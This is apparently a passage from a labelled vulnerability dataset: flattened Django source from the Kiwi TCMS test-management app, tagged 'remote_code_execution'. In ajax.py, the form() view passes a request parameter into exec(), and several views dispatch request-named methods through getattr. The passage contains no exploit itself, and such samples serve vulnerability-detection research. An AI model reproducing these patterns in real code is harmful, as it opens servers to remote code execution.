                    for tag in tc_src.tag.all():
                        tc_dest.add_tag(tag=tag)
                else:
                    tc_dest = tc_src
                    tc_dest.author = \
                        clone_form.cleaned_data[
                            'maintain_case_orignal_author'] \
                        and tc_src.author or request.user
                    tc_dest.default_tester = \
                        clone_form.cleaned_data[
                            'maintain_case_orignal_default_tester'] \
                        and tc_src.author or request.user
                    tc_dest.save()
                    for tp in clone_form.cleaned_data['plan']:
                        # create case link and keep origin plan's sortkey
                        if tp_src:
                            try:
                                tcp = TestCasePlan.objects.get(plan=tp_src,
                                                               case=tc_dest)
                                sortkey = tcp.sortkey
                            except ObjectDoesNotExist:
                                sortkey = tp.get_case_sortkey()
                        else:
                            sortkey = tp.get_case_sortkey()

                        tp.add_case(tc_dest, sortkey)

                # Add the cases to plan
                for tp in clone_form.cleaned_data['plan']:
                    # Clone the categories to new product
                    if clone_form.cleaned_data['copy_case']:
                        try:
                            tc_category = tp.product.category.get(
                                name=tc_src.category.name
                            )
                        except ObjectDoesNotExist:
                            tc_category = tp.product.category.create(
                                name=tc_src.category.name,
                                description=tc_src.category.description,
                            )

                        tc_dest.category = tc_category
                        tc_dest.save()
                        del tc_category

                    # Clone the components to new product
                    if clone_form.cleaned_data['copy_component'] and \
                            clone_form.cleaned_data['copy_case']:
                        for component in tc_src.component.all():
                            try:
                                new_c = tp.product.component.get(
                                    name=component.name
                                )
                            except ObjectDoesNotExist:
                                new_c = tp.product.component.create(
                                    name=component.name,
                                    initial_owner=request.user,
                                    description=component.description,
                                )

                            tc_dest.add_component(new_c)

            # Detect the number of items and redirect to correct one
            cases_count = len(clone_form.cleaned_data['case'])
            plans_count = len(clone_form.cleaned_data['plan'])

            if cases_count == 1 and plans_count == 1:
                return HttpResponseRedirect('%s?from_plan=%s' % (
                    reverse('testcases-get', args=[tc_dest.pk, ]),
                    tp.pk
                ))

            if cases_count == 1:
                return HttpResponseRedirect(
                    reverse('testcases-get', args=[tc_dest.pk, ])
                )

            if plans_count == 1:
                return HttpResponseRedirect(
                    reverse('test_plan_url_short', args=[tp.pk, ])
                )

            # Otherwise it will prompt to user the clone action is successful.
            messages.add_message(request,
                                 messages.SUCCESS,
                                 _('TestCase cloning was successful'))
            return HttpResponseRedirect(reverse('plans-all'))
    else:
        selected_cases = get_selected_testcases(request)
        # Initial the clone case form
        clone_form = CloneCaseForm(initial={
            'case': selected_cases,
            'copy_case': False,
            'maintain_case_orignal_author': False,
            'maintain_case_orignal_default_tester': False,
            'copy_component': True,
        })
        clone_form.populate(case_ids=selected_cases)

    # Generate search plan form
    if request_data.get('from_plan'):
        tp = TestPlan.objects.get(plan_id=request_data['from_plan'])
        search_plan_form = SearchPlanForm(
            initial={'product': tp.product_id, 'is_active': True})
        search_plan_form.populate(product_id=tp.product_id)

    submit_action = request_data.get('submit', None)
    context_data = {
        'test_plan': tp,
        'search_form': search_plan_form,
        'clone_form': clone_form,
        'submit_action': submit_action,
    }
    return render(request, template_name, context_data)


@require_POST
@permission_required('testcases.add_testcasecomponent')
def component(request):
    """"""
    Management test case components
    """"""
    # FIXME: It will update product/category/component at one time so far.
    # We may disconnect the component from case product in future.
    cas = actions.ComponentActions(request)
    action = request.POST.get('a', 'render_form')
    func = getattr(cas, action.lower())
    return func()


@require_POST
@permission_required('testcases.add_testcasecomponent')
def category(request):
    """"""Management test case categories""""""
    # FIXME: It will update product/category/component at one time so far.
    # We may disconnect the component from case product in future.
    cas = actions.CategoryActions(request)
    func = getattr(cas, request.POST.get('a', 'render_form').lower())
    return func()


@permission_required('testcases.add_testcaseattachment')
def attachment(request, case_id, template_name='case/attachment.html'):
    """"""Manage test case attachments""""""

    tc = get_object_or_404(TestCase, case_id=case_id)
    tp = plan_from_request_or_none(request)

    context_data = {
        'testplan': tp,
        'testcase': tc,
        'limit': settings.FILE_UPLOAD_MAX_SIZE,
    }
    return render(request, template_name, context_data)


def get_log(request, case_id, template_name=""management/get_log.html""):
    """"""Get the case log""""""
    tc = get_object_or_404(TestCase, case_id=case_id)

    context_data = {
        'object': tc
    }
    return render(request, template_name, context_data)


@permission_required('testcases.change_bug')
def bug(request, case_id, template_name='case/get_bug.html'):
    """"""Process the bugs for cases""""""
    # FIXME: Rewrite these codes for Ajax.Request
    tc = get_object_or_404(TestCase, case_id=case_id)

    class CaseBugActions(object):
        __all__ = ['get_form', 'render', 'add', 'remove']

        def __init__(self, request, case, template_name):
            self.request = request
            self.case = case
            self.template_name = template_name

        def render_form(self):
            form = CaseBugForm(initial={
                'case': self.case,
            })
            if request.GET.get('type') == 'table':
                return HttpResponse(form.as_table())

            return HttpResponse(form.as_p())

        def render(self, response=None):
            context_data = {
                'test_case': self.case,
                'response': response
            }
            return render(request, template_name, context_data)

        def add(self):
            # FIXME: It's may use ModelForm.save() method here.
            #        Maybe in future.
            if not self.request.user.has_perm('testcases.add_bug'):
                return self.render(response='Permission denied.')

            form = CaseBugForm(request.GET)
            if not form.is_valid():
                errors = []
                for field_name, error_messages in form.errors.items():
                    for item in error_messages:
                        errors.append(item)
                response = '\n'.join(errors)
                return self.render(response=response)

            try:
                self.case.add_bug(
                    bug_id=form.cleaned_data['bug_id'],
                    bug_system_id=form.cleaned_data['bug_system'].pk,
                    summary=form.cleaned_data['summary'],
                    description=form.cleaned_data['description'],
                )
            except Exception as e:
                return self.render(response=str(e))

            return self.render()

        def remove(self):
            if not request.user.has_perm('testcases.delete_bug'):
                return self.render(response='Permission denied.')

            try:
                self.case.remove_bug(request.GET.get('id'), request.GET.get('run_id'))
            except ObjectDoesNotExist as error:
                return self.render(response=error)

            return self.render()

    case_bug_actions = CaseBugActions(
        request=request,
        case=tc,
        template_name=template_name
    )

    if not request.GET.get('handle') in case_bug_actions.__all__:
        return case_bug_actions.render(response='Unrecognizable actions')

    func = getattr(case_bug_actions, request.GET['handle'])
    return func()


@require_GET
def plan(request, case_id):
    """"""Add and remove plan in plan tab""""""
    tc = get_object_or_404(TestCase, case_id=case_id)
    if request.GET.get('a'):
        # Search the plans from database
        if not request.GET.getlist('plan_id'):
            context_data = {
                'message': 'The case must specific one plan at leaset for '
                           'some action',
            }
            return render(
                request,
                'case/get_plan.html',
                context_data)

        tps = TestPlan.objects.filter(pk__in=request.GET.getlist('plan_id'))

        if not tps:
            context_data = {
                'testplans': tps,
                'message': 'The plan id are not exist in database at all.'
            }
            return render(
                request,
                'case/get_plan.html',
                context_data)

        # Add case plan action
        if request.GET['a'] == 'add':
            if not request.user.has_perm('testcases.add_testcaseplan'):
                context_data = {
                    'test_case': tc,
                    'test_plans': tps,
                    'message': 'Permission denied',
                }
                return render(
                    request,
                    'case/get_plan.html',
                    context_data)

            for tp in tps:
                tc.add_to_plan(tp)

        # Remove case plan action
        if request.GET['a'] == 'remove':
            if not request.user.has_perm('testcases.change_testcaseplan'):
                context_data = {
                    'test_case': tc,
                    'test_plans': tps,
                    'message': 'Permission denied',
                }
                return render(
                    request,
                    'case/get_plan.html',
                    context_data)

            for tp in tps:
                tc.remove_plan(tp)

    tps = tc.plan.all()
    tps = tps.select_related('author',
                             'type',
                             'product')

    context_data = {
        'test_case': tc,
        'test_plans': tps,
    }
    return render(
        request,
        'case/get_plan.html',
        context_data)
/n/n/ntcms/urls.py/n/n# -*- coding: utf-8 -*-

from django.conf import settings
from django.conf.urls import include, url
from django.conf.urls.static import static
from django.contrib import admin
from django.views.i18n import JavaScriptCatalog

from grappelli import urls as grappelli_urls
from attachments import urls as attachments_urls
from modernrpc.core import JSONRPC_PROTOCOL
from modernrpc.core import XMLRPC_PROTOCOL
from modernrpc.views import RPCEntryPoint
from tinymce import urls as tinymce_urls
from tcms.core import ajax
from tcms.core import views as core_views
from tcms.core.contrib.comments import views as comments_views
from tcms.core.contrib.linkreference import views as linkreference_views
from tcms.profiles import urls as profiles_urls
from tcms.testplans import urls as testplans_urls
from tcms.testcases import urls as testcases_urls
from tcms.testruns import urls as testruns_urls
from tcms.testruns import views as testruns_views
from tcms.management import views as management_views
from tcms.report import urls as report_urls
from tcms.search import advance_search


urlpatterns = [
    # iframe navigation workaround
    url(r'^navigation/', core_views.navigation, name='iframe-navigation'),

    url(r'^grappelli/', include(grappelli_urls)),
    url(r'^admin/', admin.site.urls),

    url(r'^attachments/', include(attachments_urls, namespace='attachments')),
    url(r'^tinymce/', include(tinymce_urls)),

    # Index and static zone
    url(r'^$', core_views.index, name='core-views-index'),
    url(r'^xml-rpc/', RPCEntryPoint.as_view(protocol=XMLRPC_PROTOCOL), name='xml-rpc'),
    url(r'^json-rpc/$', RPCEntryPoint.as_view(protocol=JSONRPC_PROTOCOL)),

    # Ajax call responder
    url(r'^ajax/update/$', ajax.update, name='ajax-update'),
    url(r'^ajax/update/case-status/$', ajax.update_cases_case_status),
    url(r'^ajax/update/case-run-status$', ajax.update_case_run_status,
        name='ajax-update_case_run_status'),
    url(r'^ajax/update/cases-priority/$', ajax.update_cases_priority),
    url(r'^ajax/update/cases-default-tester/$', ajax.update_cases_default_tester,
        name='ajax-update_cases_default_tester'),
    url(r'^ajax/update/cases-reviewer/$', ajax.update_cases_reviewer),
    url(r'^ajax/update/cases-sortkey/$', ajax.update_cases_sortkey),
    url(r'^ajax/get-prod-relate-obj/$', ajax.get_prod_related_obj_json),
    url(r'^management/getinfo/$', ajax.info, name='ajax-info'),
    url(r'^management/tags/$', ajax.tags, name='ajax-tags'),

    # comments
    url(r'^comments/post/', comments_views.post, name='comments-post'),
    url(r'^comments/delete/', comments_views.delete, name='comments-delete'),

    # Account information zone, such as login method
    url(r'^accounts/', include(profiles_urls)),

    # Testplans zone
    url(r'^plan/', include(testplans_urls.plan_urls)),
    url(r'^plans/', include(testplans_urls.plans_urls)),

    # Testcases zone
    url(r'^case/', include(testcases_urls.case_urls)),
    url(r'^cases/', include(testcases_urls.cases_urls)),

    # Testruns zone
    url(r'^run/', include(testruns_urls.run_urls)),
    url(r'^runs/', include(testruns_urls.runs_urls)),

    url(r'^caseruns/$', testruns_views.caseruns),
    url(r'^caserun/(?P<case_run_id>\d+)/bug/$', testruns_views.bug, name='testruns-bug'),
    url(r'^caserun/comment-many/', ajax.comment_case_runs, name='ajax-comment_case_runs'),
    url(r'^caserun/update-bugs-for-many/', ajax.update_bugs_to_caseruns),

    url(r'^linkref/add/$', linkreference_views.add, name='linkref-add'),
    url(r'^linkref/remove/(?P<link_id>\d+)/$', linkreference_views.remove),

    # Management zone
    url(r'^environment/groups/$', management_views.environment_groups,
        name='mgmt-environment_groups'),
    url(r'^environment/group/edit/$', management_views.environment_group_edit,
        name='mgmt-environment_group_edit'),
    url(r'^environment/properties/$', management_views.environment_properties,
        name='mgmt-environment_properties'),
    url(r'^environment/properties/values/$', management_views.environment_property_values,
        name='mgmt-environment_property_values'),

    # Report zone
    url(r'^report/', include(report_urls)),

    # Advance search
    url(r'^advance-search/$', advance_search, name='advance_search'),

    # TODO: do we need this at all ???
    # Using admin js without admin permission
    # https://docs.djangoproject.com/en/1.11/topics/i18n/translation/#django.views.i18n.JavaScriptCatalog
    url(r'^jsi18n/$', JavaScriptCatalog.as_view()),
]

# Debug zone

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)

    try:
        import debug_toolbar

        urlpatterns += [
            url(r'^__debug__/', include(debug_toolbar.urls)),
        ]
    # in case we're trying to debug in production
    # and debug_toolbar is not installed
    except ImportError:
        pass

# Overwrite default 500 handler
# More details could see django.core.urlresolvers._resolve_special()
handler500 = 'tcms.core.views.error.server_error'
/n/n/n",0,remote_code_execution
7,61,bb986000ed3cb222832e1e4535dd6316d32503f8,"/tcms/core/ajax.py/n/n# -*- coding: utf-8 -*-
""""""
Shared functions for plan/case/run.

Most of these functions are use for Ajax.
""""""
import datetime
import sys
import json
from distutils.util import strtobool

from django import http
from django.db.models import Q, Count
from django.contrib.auth.models import User
from django.core import serializers
from django.core.exceptions import ObjectDoesNotExist
from django.apps import apps
from django.forms import ValidationError
from django.http import Http404
from django.http import HttpResponse
from django.shortcuts import render
from django.views.decorators.http import require_GET
from django.views.decorators.http import require_POST

from tcms.signals import POST_UPDATE_SIGNAL
from tcms.management.models import Component, Build, Version
from tcms.management.models import Priority
from tcms.management.models import Tag
from tcms.management.models import EnvGroup, EnvProperty, EnvValue
from tcms.testcases.models import TestCase, Bug
from tcms.testcases.models import Category
from tcms.testcases.models import TestCaseStatus, TestCaseTag
from tcms.testcases.views import plan_from_request_or_none
from tcms.testplans.models import TestPlan, TestCasePlan, TestPlanTag
from tcms.testruns.models import TestRun, TestCaseRun, TestCaseRunStatus, TestRunTag
from tcms.core.helpers.comments import add_comment
from tcms.core.utils.validations import validate_bug_id


def check_permission(request, ctype):
    perm = '%s.change_%s' % tuple(ctype.split('.'))
    if request.user.has_perm(perm):
        return True
    return False


def strip_parameters(request_dict, skip_parameters):
    parameters = {}
    for key, value in request_dict.items():
        if key not in skip_parameters and value:
            parameters[str(key)] = value

    return parameters


@require_GET
def info(request):
    """"""Ajax responder for misc information""""""

    objects = _InfoObjects(request=request, product_id=request.GET.get('product_id'))
    info_type = getattr(objects, request.GET.get('info_type'))

    if not info_type:
        return HttpResponse('Unrecognizable info-type')

    if request.GET.get('format') == 'ulli':
        field = request.GET.get('field', default='name')

        response_str = '<ul>'
        for obj_value in info_type().values(field):
            response_str += '<li>' + obj_value.get(field, None) + '</li>'
        response_str += '</ul>'

        return HttpResponse(response_str)

    return HttpResponse(serializers.serialize('json', info_type(), fields=('name', 'value')))


class _InfoObjects(object):

    def __init__(self, request, product_id=None):
        self.request = request
        try:
            self.product_id = int(product_id)
        except (ValueError, TypeError):
            self.product_id = 0

    def builds(self):
        try:
            is_active = strtobool(self.request.GET.get('is_active', default='False'))
        except (ValueError, TypeError):
            is_active = False

        return Build.objects.filter(product_id=self.product_id, is_active=is_active)

    def categories(self):
        return Category.objects.filter(product__id=self.product_id)

    def components(self):
        return Component.objects.filter(product__id=self.product_id)

    def env_groups(self):
        return EnvGroup.objects.all()

    def env_properties(self):
        if self.request.GET.get('env_group_id'):
            return EnvGroup.objects.get(id=self.request.GET['env_group_id']).property.all()
        return EnvProperty.objects.all()

    def env_values(self):
        return EnvValue.objects.filter(property__id=self.request.GET.get('env_property_id'))

    def users(self):
        query = strip_parameters(self.request.GET, skip_parameters=('info_type', 'field', 'format'))
        return User.objects.filter(**query)

    def versions(self):
        return Version.objects.filter(product__id=self.product_id)


@require_GET
def form(request):
    """"""Response get form ajax call, most using in dialog""""""

    # The parameters in internal_parameters will delete from parameters
    internal_parameters = ['app_form', 'format']
    parameters = strip_parameters(request.GET, internal_parameters)
    q_app_form = request.GET.get('app_form')
    q_format = request.GET.get('format')
    if not q_format:
        q_format = 'p'

    if not q_app_form:
        return HttpResponse('Unrecognizable app_form')

    # Get the form
    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]
    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))
    __import__('tcms.%s.forms' % q_app)
    q_app_module = sys.modules['tcms.%s.forms' % q_app]
    form_class = getattr(q_app_module, q_form)
    form_params = form_class(initial=parameters)

    # Generate the HTML and reponse
    html = getattr(form_params, 'as_' + q_format)
    return HttpResponse(html())


def tags(request):
    """""" Get tags for TestPlan, TestCase or TestRun """"""

    tag_objects = _TagObjects(request)
    template_name, obj = tag_objects.get()

    q_tag = request.GET.get('tags')
    q_action = request.GET.get('a')

    if q_action:
        tag_actions = _TagActions(obj=obj, tag_name=q_tag)
        getattr(tag_actions, q_action)()

    all_tags = obj.tag.all().order_by('pk')
    test_plan_tags = TestPlanTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_plans=Count('tag')).order_by('tag')
    test_case_tags = TestCaseTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_cases=Count('tag')).order_by('tag')
    test_run_tags = TestRunTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_runs=Count('tag')).order_by('tag')

    plan_counter = _TagCounter('num_plans', test_plan_tags)
    case_counter = _TagCounter('num_cases', test_case_tags)
    run_counter = _TagCounter('num_runs', test_run_tags)

    for tag in all_tags:
        tag.num_plans = plan_counter.calculate_tag_count(tag)
        tag.num_cases = case_counter.calculate_tag_count(tag)
        tag.num_runs = run_counter.calculate_tag_count(tag)

    context_data = {
        'tags': all_tags,
        'object': obj,
    }
    return render(request, template_name, context_data)


class _TagObjects(object):
    """""" Used for getting the chosen object(TestPlan, TestCase or TestRun) from the database """"""

    def __init__(self, request):
        """"""
        :param request: An HTTP GET request, containing the primary key
                        and the type of object to be selected
        :type request: HttpRequest
        """"""
        for obj in ['plan', 'case', 'run']:
            if request.GET.get(obj):
                self.object = obj
                self.object_pk = request.GET.get(obj)
                break

    def get(self):
        func = getattr(self, self.object)
        return func()

    def plan(self):
        return 'management/get_tag.html', TestPlan.objects.get(pk=self.object_pk)

    def case(self):
        return 'management/get_tag.html', TestCase.objects.get(pk=self.object_pk)

    def run(self):
        return 'run/get_tag.html', TestRun.objects.get(pk=self.object_pk)


class _TagActions(object):
    """""" Used for performing the 'add' and 'remove' actions on a given tag """"""

    def __init__(self, obj, tag_name):
        """"""
        :param obj: the object for which the tag actions would be performed
        :type obj: either a :class:`tcms.testplans.models.TestPlan`,
                          a :class:`tcms.testcases.models.TestCase` or
                          a :class:`tcms.testruns.models.TestRun`
        :param tag_name: The name of the tag to be manipulated
        :type tag_name: str
        """"""
        self.obj = obj
        self.tag_name = tag_name

    def add(self):
        tag, _ = Tag.objects.get_or_create(name=self.tag_name)
        self.obj.add_tag(tag)

    def remove(self):
        tag = Tag.objects.get(name=self.tag_name)
        self.obj.remove_tag(tag)


class _TagCounter(object):
    """""" Used for counting the number of times a tag is assigned to TestRun/TestCase/TestPlan """"""

    def __init__(self, key, test_tags):
        """"""
         :param key: either 'num_plans', 'num_cases', 'num_runs', depending on what you want count
         :type key: str
         :param test_tags: query set, containing the Tag->Object relationship, ordered by tag and
                            annotated by key
            e.g. TestPlanTag, TestCaseTag ot TestRunTag
         :type test_tags: QuerySet
        """"""
        self.key = key
        self.test_tags = iter(test_tags)
        self.counter = {'tag': 0}

    def calculate_tag_count(self, tag):
        """"""
        :param tag: the tag you do the counting for
        :type tag: :class:`tcms.management.models.Tag`
        :return: the number of times a tag is assigned to object
        :rtype: int
        """"""
        if self.counter['tag'] != tag.pk:
            try:
                self.counter = self.test_tags.__next__()
            except StopIteration:
                return 0

        if tag.pk == self.counter['tag']:
            return self.counter[self.key]
        return 0


def get_value_by_type(val, v_type):
    """"""
    Exampls:
    1. get_value_by_type('True', 'bool')
    (1, None)
    2. get_value_by_type('19860624 123059', 'datetime')
    (datetime.datetime(1986, 6, 24, 12, 30, 59), None)
    3. get_value_by_type('5', 'int')
    ('5', None)
    4. get_value_by_type('string', 'str')
    ('string', None)
    5. get_value_by_type('everything', 'None')
    (None, None)
    6. get_value_by_type('buggy', 'buggy')
    (None, 'Unsupported value type.')
    7. get_value_by_type('string', 'int')
    (None, ""invalid literal for int() with base 10: 'string'"")
    """"""
    value = error = None

    def get_time(time):
        date_time = datetime.datetime
        if time == 'NOW':
            return date_time.now()
        return date_time.strptime(time, '%Y%m%d %H%M%S')

    pipes = {
        # Temporary solution is convert all of data to str
        # 'bool': lambda x: x == 'True',
        'bool': lambda x: x == 'True' and 1 or 0,
        'datetime': get_time,
        'int': lambda x: str(int(x)),
        'str': lambda x: str(x),
        'None': lambda x: None,
    }
    pipe = pipes.get(v_type, None)
    if pipe is None:
        error = 'Unsupported value type.'
    else:
        try:
            value = pipe(val)
        except Exception as e:
            error = str(e)
    return value, error


def say_no(error_msg):
    ajax_response = {'rc': 1, 'response': error_msg}
    return HttpResponse(json.dumps(ajax_response))


def say_yes():
    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))


# Deprecated. Not flexible.
@require_POST
def update(request):
    """"""
    Generic approach to update a model,\n
    based on contenttype.
    """"""
    now = datetime.datetime.now()

    data = request.POST.copy()
    ctype = data.get(""content_type"")
    vtype = data.get('value_type', 'str')
    object_pk_str = data.get(""object_pk"")
    field = data.get('field')
    value = data.get('value')

    object_pk = [int(a) for a in object_pk_str.split(',')]

    if not field or not value or not object_pk or not ctype:
        return say_no(
            'Following fields are required - content_type, '
            'object_pk, field and value.')

    # Convert the value type
    # FIXME: Django bug here: update() keywords must be strings
    field = str(field)

    value, error = get_value_by_type(value, vtype)
    if error:
        return say_no(error)
    has_perms = check_permission(request, ctype)
    if not has_perms:
        return say_no('Permission Dinied.')

    model = apps.get_model(*ctype.split(""."", 1))
    targets = model._default_manager.filter(pk__in=object_pk)

    if not targets:
        return say_no('No record found')
    if not hasattr(targets[0], field):
        return say_no('%s has no field %s' % (ctype, field))

    if hasattr(targets[0], 'log_action'):
        for t in targets:
            try:
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), value
                    )
                )
            except (AttributeError, User.DoesNotExist):
                pass
    objects_update(targets, **{field: value})

    if hasattr(model, 'mail_scene'):
        mail_context = model.mail_scene(
            objects=targets, field=field, value=value, ctype=ctype,
            object_pk=object_pk,
        )
        if mail_context:
            from tcms.core.utils.mailto import mailto

            mail_context['context']['user'] = request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    # Special hacking for updating test case run status
    if ctype == 'testruns.testcaserun' and field == 'case_run_status':
        for t in targets:
            field = 'close_date'
            t.log_action(
                who=request.user,
                action='Field %s changed from %s to %s.' % (
                    field, getattr(t, field), now
                )
            )
            if t.tested_by != request.user:
                field = 'tested_by'
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), request.user
                    )
                )

            field = 'assignee'
            try:
                assignee = t.assginee
                if assignee != request.user:
                    t.log_action(
                        who=request.user,
                        action='Field %s changed from %s to %s.' % (
                            field, getattr(t, field), request.user
                        )
                    )
                    # t.assignee = request.user
                t.save()
            except (AttributeError, User.DoesNotExist):
                pass
        targets.update(close_date=now, tested_by=request.user)
    return say_yes()


@require_POST
def update_case_run_status(request):
    """"""
    Update Case Run status.
    """"""
    now = datetime.datetime.now()

    data = request.POST.copy()
    ctype = data.get(""content_type"")
    vtype = data.get('value_type', 'str')
    object_pk_str = data.get(""object_pk"")
    field = data.get('field')
    value = data.get('value')

    object_pk = [int(a) for a in object_pk_str.split(',')]

    if not field or not value or not object_pk or not ctype:
        return say_no(
            'Following fields are required - content_type, '
            'object_pk, field and value.')

    # Convert the value type
    # FIXME: Django bug here: update() keywords must be strings
    field = str(field)

    value, error = get_value_by_type(value, vtype)
    if error:
        return say_no(error)
    has_perms = check_permission(request, ctype)
    if not has_perms:
        return say_no('Permission Dinied.')

    model = apps.get_model(*ctype.split(""."", 1))
    targets = model._default_manager.filter(pk__in=object_pk)

    if not targets:
        return say_no('No record found')
    if not hasattr(targets[0], field):
        return say_no('%s has no field %s' % (ctype, field))

    if hasattr(targets[0], 'log_action'):
        for t in targets:
            try:
                t.log_action(
                    who=request.user,
                    action='Field {} changed from {} to {}.'.format(
                        field,
                        getattr(t, field),
                        TestCaseRunStatus.id_to_string(value),
                    )
                )
            except (AttributeError, User.DoesNotExist):
                pass
    objects_update(targets, **{field: value})

    if hasattr(model, 'mail_scene'):
        from tcms.core.utils.mailto import mailto

        mail_context = model.mail_scene(
            objects=targets, field=field, value=value, ctype=ctype,
            object_pk=object_pk,
        )
        if mail_context:
            mail_context['context']['user'] = request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    # Special hacking for updating test case run status
    if ctype == 'testruns.testcaserun' and field == 'case_run_status':
        for t in targets:
            field = 'close_date'
            t.log_action(
                who=request.user,
                action='Field %s changed from %s to %s.' % (
                    field, getattr(t, field), now
                )
            )
            if t.tested_by != request.user:
                field = 'tested_by'
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), request.user
                    )
                )

            field = 'assignee'
            try:
                assignee = t.assginee
                if assignee != request.user:
                    t.log_action(
                        who=request.user,
                        action='Field %s changed from %s to %s.' % (
                            field, getattr(t, field), request.user
                        )
                    )
                    # t.assignee = request.user
                t.save()
            except (AttributeError, User.DoesNotExist):
                pass
        targets.update(close_date=now, tested_by=request.user)

    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))


class ModelUpdateActions(object):
    """"""Abstract class defining interfaces to update a model properties""""""


class TestCaseUpdateActions(ModelUpdateActions):
    """"""Actions to update each possible proprety of TestCases

    Define your own method named _update_[property name] to hold specific
    update logic.
    """"""

    ctype = 'testcases.testcase'

    def __init__(self, request):
        self.request = request
        self.target_field = request.POST.get('target_field')
        self.new_value = request.POST.get('new_value')

    def get_update_action(self):
        return getattr(self, '_update_%s' % self.target_field, None)

    def update(self):
        has_perms = check_permission(self.request, self.ctype)
        if not has_perms:
            return say_no(""You don't have enough permission to update TestCases."")

        action = self.get_update_action()
        if action is not None:
            try:
                resp = action()
                self._sendmail()
            except ObjectDoesNotExist as err:
                return say_no(str(err))
            except Exception:
                # TODO: besides this message to users, what happening should be
                # recorded in the system log.
                return say_no('Update failed. Please try again or request '
                              'support from your organization.')
            else:
                if resp is None:
                    resp = say_yes()
                return resp
        return say_no('Not know what to update.')

    def get_update_targets(self):
        """"""Get selected cases to update their properties""""""
        case_ids = map(int, self.request.POST.getlist('case'))
        self._update_objects = TestCase.objects.filter(pk__in=case_ids)
        return self._update_objects

    def get_plan(self, pk_enough=True):
        try:
            return plan_from_request_or_none(self.request, pk_enough)
        except Http404:
            return None

    def _sendmail(self):
        mail_context = TestCase.mail_scene(objects=self._update_objects,
                                           field=self.target_field,
                                           value=self.new_value)
        if mail_context:
            from tcms.core.utils.mailto import mailto

            mail_context['context']['user'] = self.request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    def _update_priority(self):
        exists = Priority.objects.filter(pk=self.new_value).exists()
        if not exists:
            raise ObjectDoesNotExist('The priority you specified to change '
                                     'does not exist.')
        self.get_update_targets().update(**{str(self.target_field): self.new_value})

    def _update_default_tester(self):
        try:
            user = User.objects.get(Q(username=self.new_value) | Q(email=self.new_value))
        except User.DoesNotExist:
            raise ObjectDoesNotExist('Default tester not found!')
        self.get_update_targets().update(**{str(self.target_field): user.pk})

    def _update_case_status(self):
        try:
            new_status = TestCaseStatus.objects.get(pk=self.new_value)
        except TestCaseStatus.DoesNotExist:
            raise ObjectDoesNotExist('The status you choose does not exist.')

        update_object = self.get_update_targets()
        if not update_object:
            return say_no('No record(s) found')

        for testcase in update_object:
            if hasattr(testcase, 'log_action'):
                testcase.log_action(
                    who=self.request.user,
                    action='Field %s changed from %s to %s.' % (
                        self.target_field, testcase.case_status, new_status.name
                    )
                )
        update_object.update(**{str(self.target_field): self.new_value})

        # ###
        # Case is moved between Cases and Reviewing Cases tabs accoding to the
        # change of status. Meanwhile, the number of cases with each status
        # should be updated also.

        try:
            plan = plan_from_request_or_none(self.request)
        except Http404:
            return say_no(""No plan record found."")
        else:
            if plan is None:
                return say_no('No plan record found.')

        confirm_status_name = 'CONFIRMED'
        plan.run_case = plan.case.filter(case_status__name=confirm_status_name)
        plan.review_case = plan.case.exclude(case_status__name=confirm_status_name)
        run_case_count = plan.run_case.count()
        case_count = plan.case.count()
        # FIXME: why not calculate review_case_count or run_case_count by using
        # substraction, which saves one SQL query.
        review_case_count = plan.review_case.count()

        return http.JsonResponse({
            'rc': 0, 'response': 'ok',
            'run_case_count': run_case_count,
            'case_count': case_count,
            'review_case_count': review_case_count,
        })

    def _update_sortkey(self):
        try:
            sortkey = int(self.new_value)
            if sortkey < 0 or sortkey > 32300:
                return say_no('New sortkey is out of range [0, 32300].')
        except ValueError:
            return say_no('New sortkey is not an integer.')
        plan = plan_from_request_or_none(self.request, pk_enough=True)
        if plan is None:
            return say_no('No plan record found.')
        update_targets = self.get_update_targets()

        # ##
        # MySQL does not allow to exeucte UPDATE statement that contains
        # subquery querying from same table. In this case, OperationError will
        # be raised.
        offset = 0
        step_length = 500
        queryset_filter = TestCasePlan.objects.filter
        data = {self.target_field: sortkey}
        while 1:
            sub_cases = update_targets[offset:offset + step_length]
            case_pks = [case.pk for case in sub_cases]
            if len(case_pks) == 0:
                break
            queryset_filter(plan=plan, case__in=case_pks).update(**data)
            # Move to next batch of cases to change.
            offset += step_length

    def _update_reviewer(self):
        reviewers = User.objects.filter(username=self.new_value).values_list('pk', flat=True)
        if not reviewers:
            err_msg = 'Reviewer %s is not found' % self.new_value
            raise ObjectDoesNotExist(err_msg)
        self.get_update_targets().update(**{str(self.target_field): reviewers[0]})


# NOTE: what permission is necessary
# FIXME: find a good chance to map all TestCase property change request to this
@require_POST
def update_cases_default_tester(request):
    """"""Update default tester upon selected TestCases""""""
    proxy = TestCaseUpdateActions(request)
    return proxy.update()


update_cases_priority = update_cases_default_tester
update_cases_case_status = update_cases_default_tester
update_cases_sortkey = update_cases_default_tester
update_cases_reviewer = update_cases_default_tester


@require_POST
def comment_case_runs(request):
    """"""
    Add comment to one or more caseruns at a time.
    """"""
    data = request.POST.copy()
    comment = data.get('comment', None)
    if not comment:
        return say_no('Comments needed')
    run_ids = [i for i in data.get('run', '').split(',') if i]
    if not run_ids:
        return say_no('No runs selected.')
    runs = TestCaseRun.objects.filter(pk__in=run_ids).only('pk')
    if not runs:
        return say_no('No caserun found.')
    add_comment(runs, comment, request.user)
    return say_yes()


def clean_bug_form(request):
    """"""
    Verify the form data, return a tuple\n
    (None, ERROR_MSG) on failure\n
    or\n
    (data_dict, '') on success.\n
    """"""
    data = {}
    try:
        data['bugs'] = request.GET.get('bug_id', '').split(',')
        data['runs'] = map(int, request.GET.get('case_runs', '').split(','))
    except (TypeError, ValueError) as e:
